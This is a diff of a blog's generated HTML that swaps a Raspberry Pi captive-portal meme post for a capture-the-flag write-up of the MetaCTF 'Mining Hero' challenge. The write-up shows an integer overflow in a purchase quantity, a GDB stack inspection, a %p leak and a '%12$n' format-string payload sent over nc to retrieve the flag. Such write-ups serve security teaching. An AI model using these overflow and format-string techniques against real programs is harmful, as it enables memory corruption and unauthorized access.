class="s2">"problemsolving.jpg"</span><span class="p">,</span> <span class="s2">"putmebackintoacoma.png"</span><span class="p">,</span> <span class="s2">"reallythatsthespermthatwon.jpeg"</span><span class="p">,</span> <span class="s2">"recordedconversation.jpg"</span><span class="p">,</span> <span class="s2">"researchonisis.jpg"</span><span class="p">,</span> <span class="s2">"sayingno.jpg"</span><span class="p">,</span> <span class="s2">"schrodingersplates.jpg"</span><span class="p">,</span> <span class="s2">"sentencewithouta.jpg"</span><span class="p">,</span> <span class="s2">"shoppingcarts.jpg"</span><span class="p">,</span> <span class="s2">"shortpeoplesuck.jpg"</span><span class="p">,</span> <span class="s2">"sleepinginvideogames.jpeg"</span><span class="p">,</span> <span class="s2">"sneezing.png"</span><span class="p">,</span> <span class="s2">"solutiontopeopleeatingyourfood.jpeg"</span><span class="p">,</span> <span class="s2">"soundmorephotosynthesis.jpg"</span><span class="p">,</span> <span class="s2">"studentloans.jpg"</span><span class="p">,</span> <span class="s2">"stuffynose.jpg"</span><span class="p">,</span> <span class="s2">"stupidshit.jpg"</span><span class="p">,</span> <span class="s2">"talktorocks.png"</span><span class="p">,</span> <span class="s2">"taskmanager.jpg"</span><span class="p">,</span> <span class="s2">"temporarybuildings.jpg"</span><span class="p">,</span> <span class="s2">"thankyou.jpg"</span><span class="p">,</span> <span class="s2">"thedouchestorecalled.jpeg"</span><span class="p">,</span> <span class="s2">"thefemaleisontheright.jpg"</span><span class="p">,</span> <span class="s2">"theidiotshouse.jpg"</span><span class="p">,</span> <span class="s2">"thesacredtexts.jpg"</span><span class="p">,</span> <span class="s2">"timetoretire.jpg"</span><span class="p">,</span> <span class="s2">"universityofnorthtexas.jpg"</span><span class="p">,</span> <span class="s2">"wheremyloveis.png"</span><span class="p">,</span> <span class="s2">"whoistheloveofmylife.png"</span><span class="p">,</span> <span class="s2">"whospresentingnext.jpg"</span><span class="p">,</span> <span class="s2">"whyarethewaythatyouare.png"</span><span class="p">,</span> <span class="s2">"wifeswrath.jpg"</span><span class="p">,</span> <span class="s2">"wificonnected.png"</span><span class="p">,</span> <span class="s2">"yelpforcoworkers.jpg"</span><span class="p">,</span> <span class="s2">"yomamasofatshesataxi.jpg"</span><span class="p">,</span> <span class="s2">"youdontfloss.jpg"</span><span class="p">,</span> <span class="s2">"yourfat.jpeg"</span><span class="p">,</span> <span class="s2">"yourpov.jpg"</span><span class="p">,</span> <span class="s2">"yourstupid.jpg"</span><span class="p">]</span>
-            <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="o">*</span><span class="nx">files</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
-            <span class="kd">var</span> <span class="nx">image</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">images</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-            <span class="nx">image</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">"img/"</span> <span class="o">+</span> <span class="nx">files</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
-        <span class="nt">&lt;/script&gt;</span>
-    <span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+<p>The program returned a solution of <code class="highlighter-rouge">count = 9223372036854775808</code>. To see why this solution works, take a look at the following:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span>
+<span class="mi">9223372036854775808000000000000000</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span><span class="p">)</span>
+<span class="s">'0b11100011010111111010100100110001101000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
+<span class="mi">113</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span><span class="p">)[</span><span class="o">-</span><span class="mi">64</span><span class="p">:]</span>
+<span class="s">'0000000000000000000000000000000000000000000000000000000000000000'</span>
 </code></pre></div></div>
 
-<p>This is essentially a small script that randomly selects one of the memes I’ve downloaded and displays it. I also moved all of the images of the memes I downloaded earlier to /etc/nodogsplash/htdocs/img/.</p>
+<p>Technically, doing <code class="highlighter-rouge">total = 1000000000000000 * 9223372036854775808</code> returns a value that is much greater than the price. However, when we look at the binary representation of this value, we can see that the value needs 113 bits of storage, and the first 64 bits are all zeros. When we use this value as the quantity, we end up only storing 64 bits of zeros in the program. Using this value lets us buy a shout out from god.</p>
 
-<p>There is just one more step. The computer needs to know that it has to start nodogsplash on boot, so I opened the /etc/rc.local file added “nodogsplash” on top of the line that says “exit 0”.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+shout-out-from-literally-god
+How many would you like to buy? Must be greater than 0
+9223372036854775808
+Hmmmm
+Nihaal
+You have done well!
+Good job!
+Sincerely,
+	~God
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+</code></pre></div></div>
 
-<p>And that’s it! All I had to do now was to reboot my computer so that all of my settings would be applied. Thanks for reading this!</p>
+<p>Now we just need to exploit the format string vulnerability that we saw earlier. Using GDB, I set a breakpoint at the location where the format string vulnerability occurred, and I printed out the address of the value that I wanted to change.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, purchase () at text-game.cpp:164
+164         printf(name.c_str());
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x6
+$rbx   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 ("tool"?)
+$rcx   : 0x00007ffff7cc51e7  →  0x5177fffff0003d48 ("H="?)
+$rdx   : 0x0
+$rsp   : 0x00007fffffffda70  →  0xff00ffffffffffff
+$rbp   : 0x00007fffffffdd70  →  0x00007fffffffddd0  →  0x0000000000000000
+$rsi   : 0x0000555555570eb0  →  "Hmmmm\nny would you like to buy? Must be greater t[...]"
+$rdi   : 0x00007ffff7da24c0  →  0x0000000000000000
+$rip   : 0x0000555555557569  →  &lt;purchase()+1545&gt; lea rdi, [rip+0x6d30]        # 0x55555555e2a0 &lt;_Z4nameB5cxx11&gt;
+$r8    : 0x6
+$r9    : 0x00007ffff7d9f240  →  0x0000000000000008
+$r10   : 0x00007ffff7e1d499  →  "_ZNKSt7num_getIcSt19istreambuf_iteratorIcSt11char_[...]"
+$r11   : 0x246
+$r12   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 ("tool"?)
+$r13   : 0x3
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffda70│+0x0000: 0xff00ffffffffffff   ← $rsp
+0x00007fffffffda78│+0x0008: 0x8000000000000000
+0x00007fffffffda80│+0x0010: 0xffffffffffffffff
+0x00007fffffffda88│+0x0018: 0x00007fffffffdad0  →  0x0000000000000000
+0x00007fffffffda90│+0x0020: 0x00038d7ea4c68000
+0x00007fffffffda98│+0x0028: 0x0000000000000000
+0x00007fffffffdaa0│+0x0030: 0x00007fffffffda76  →  0x000000000000ff00
+0x00007fffffffdaa8│+0x0038: 0x0000555555571750  →  0x0000555555571760  →  0x000000006c6f6f74 ("tool"?)
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555557556 &lt;purchase()+1526&gt; mov    QWORD PTR [rbp-0x2d0], rax
+   0x55555555755d &lt;purchase()+1533&gt; lea    rdi, [rip+0x2f6a]        # 0x55555555a4ce
+   0x555555557564 &lt;purchase()+1540&gt; call   0x555555556620 &lt;puts@plt&gt;
+ → 0x555555557569 &lt;purchase()+1545&gt; lea    rdi, [rip+0x6d30]        # 0x55555555e2a0 &lt;_Z4nameB5cxx11&gt;
+   0x555555557570 &lt;purchase()+1552&gt; call   0x555555556410 &lt;_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv@plt&gt;
+   0x555555557575 &lt;purchase()+1557&gt; mov    rdi, rax
+   0x555555557578 &lt;purchase()+1560&gt; mov    eax, 0x0
+   0x55555555757d &lt;purchase()+1565&gt; call   0x555555556390 &lt;printf@plt&gt;
+   0x555555557582 &lt;purchase()+1570&gt; lea    rdi, [rip+0x2f4b]        # 0x55555555a4d4
+────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:text-game.cpp+164 ────
+    159         tool_time = 50000;
+    160     } else if(option == "shout-out-from-literally-god"){
+    161         bool god_is_happy = rand() &amp; 0xFFFFFF == 0;
+    162         bool* god_is_really_happy = &amp;god_is_happy;
+    163         printf("Hmmmm\n");
+ →  164         printf(name.c_str());
+    165         printf("\nYou have done well!\n");
+    166         printf("Good job!\n");
+    167
+    168         if(*god_is_really_happy){
+    169             printf("I'm feeling generous right now!\nHave a flag!\n");
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "text-game", stopped, reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x555555557569 → purchase()
+[#1] 0x555555557a0d → main(argc=0x1, argv=0x7fffffffdec8)
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  print god_is_really_happy
+$1 = (bool *) 0x7fffffffda76
+</code></pre></div></div>
+
+<p>The address was <code class="highlighter-rouge">0x7fffffffda76</code>, and since I had ASLR disabled on my machine, I just needed to search for the location of this address when I used a string formatter in my name. In the below example, you can see that the address <code class="highlighter-rouge">0x7fffffffda76</code> is the twelfth pointer being popped off of the stack.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting program: /home/n/Documents/Exploitation/metactf/Mining Hero/text-game
+Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
+Before we continue, what is your name?
+%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+shout-out-from-literally-god
+How many would you like to buy? Must be greater than 0
+9223372036854775808
+Hmmmm
+0x555555570eb0.(nil).0x7ffff7cc51e7.0x6.0x7ffff7d9f240.0x250070252e70252e.0x8000000000000000.0x2e70252e70252e70.0x7fffffffdad0.0x38d7ea4c68000.(nil).0x7fffffffda76.0x555555571720.0x555555571ef0.(nil).0x7fffffffdad8.(nil).(nil).(nil).0x555555571ef0.0x555555571ea0.0x555555571700.0x3.0x5555555716d0.0x1c.0x1e.0x2d6d6f72662d74.(nil).(nil).(nil).(nil).0x7fffffffdb50.0x4.0x6c6f6f74.(nil).0x64.0x7fffffffdb78.0xd.0x676172756f636e65.0x746e656d65.0x14.0x5555555716d0.0x1c.0x1c.(nil).0x38d7ea4c68000.(nil).0x2.0x800000000000000e.(nil).0x7ffff7c467b2.(nil).0x7ffff7e6d198.(nil).0x7ffff7da06a0.0x7ffff7fa0700.0x3.0x7ffff7f951a8.0x7ffff7f93ec0.0xff00000006.0x7ffff7c3a541.0x7ffff7d9f980.0x7ffff7d9f980.0x7ffff7da08a0.0x5d4990340e914700.(nil).0x7ffff7fa0700.(nil).0x7ffff7f951a8.0x7ffff7f93ec0.(nil).0x55555555e160.0x7ffff7e69f38.0x7ffff7fa0700.0x7fffffffdca0.0x7ffff7fa0700.0x6.0x6.0x5d4990340e914700.0x7fffffffdd2f.0x7fffffffdd30.0x7fffffffdd30.0x7ffff7f9ed00.0x33.0x33.0x7ffff7f9ed00.0x7ffff7e85176.0xa.0x3fffffffffffffff.0x7ffff7fa0700.0x1.0xf7f6f5f4f3f2f101.0x7ffff7f061ee.0x7ffff7fa0ce0.0x555555559eb0.0x7fffffffdd70.0x5d4990340e914700.0x7fffffffdec0.0x555555559eb0.0x5555555566b0.0x7fffffffdec0.0x7fffffffddd0.0x555555557a0d.0x7fffffffdec8.0x155557b43.0x7fffffffdda0.0x1.0x7ffff7da0033.0x555555559eb0.(nil).0x5d4990340e914700.0x555555559eb0.0x5555555566b0.(nil).0x7ffff7bdb0b3.0x7ffff7d9fb80.0x7fffffffdec8.0x100011c00.0x5555555577de.0x555555559eb0.0x4bf57339303d8b0.0x5555555566b0.0x7fffffffdec0.(nil).(nil).0xfb40a8cc28c3d8b0.0xfb40b848f3cdd8b0.(nil).(nil).(nil).0x1.0x7fffffffdec8.0x7fffffffded8.0x7ffff7ffe190.(nil).(nil).0x5555555566b0.0x7fffffffdec0.(nil).(nil).0x5555555566de.0x7fffffffdeb8.0x1c.0x1.0x7fffffffe243.(nil).0x7fffffffe280.0x7fffffffe290.0x7fffffffe2d8.0x7fffffffe2eb.0x7fffffffe2ff.0x7fffffffe32c.0x7fffffffe343.0x7fffffffe36f.0x7fffffffe381.0x7fffffffe3b7.0x7fffffffe3ce.0x7fffffffe3ee.0x7fffffffe402.0x7fffffffe42b.0x7fffffffe43f.0x7fffffffe456.0x7fffffffe46e.0x7fffffffe481.0x7fffffffe49d.0x7fffffffe4d4.0x7fffffffe4ef.0x7fffffff
+</code></pre></div></div>
+
+<p>This meant that if used the <code class="highlighter-rouge">%12$n</code> format string in my name, I would write to the twelfth address on the stack. Since the twelfth address on the stack is the <code class="highlighter-rouge">god_is_really_happy</code> pointer, we will be able to change the value of <code class="highlighter-rouge">god_is_happy</code> to true and get the flag!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc host1.metaproblems.com 5950
+Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
+Before we continue, what is your name?
+1%12$n
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+9223372036854775808
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+shout-out-from-literally-god
+How many would you like to buy? Must be greater than 0
+9223372036854775808
+Hmmmm
+1
+You have done well!
+Good job!
+I'm feeling generous right now!
+Have a flag!
+MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}
+Sincerely,
+    ~God
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+</code></pre></div></div>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2020/10/25/mining-hero-vulnerabilities.html">
-          Mining Hero Vulnerabilities
-        </a>
-      </li>
     
       <li style="color: black; font-size: 9;">
         <a href="/2020/10/21/simple-heap-buffer-overflow.html">
@@ -328,6 +611,12 @@ sudo make install
       <li style="color: black; font-size: 9;">
         <a href="/2020/10/14/return-oriented-programming-tutorial.html">
           Return Oriented Programming Tutorial
+        </a>
+      </li>
+    
+      <li style="color: black; font-size: 9;">
+        <a href="/2020/07/21/pentesting-greenoptic-1.html">
+          Pentesting GreenOptic: 1
         </a>
       </li>
     
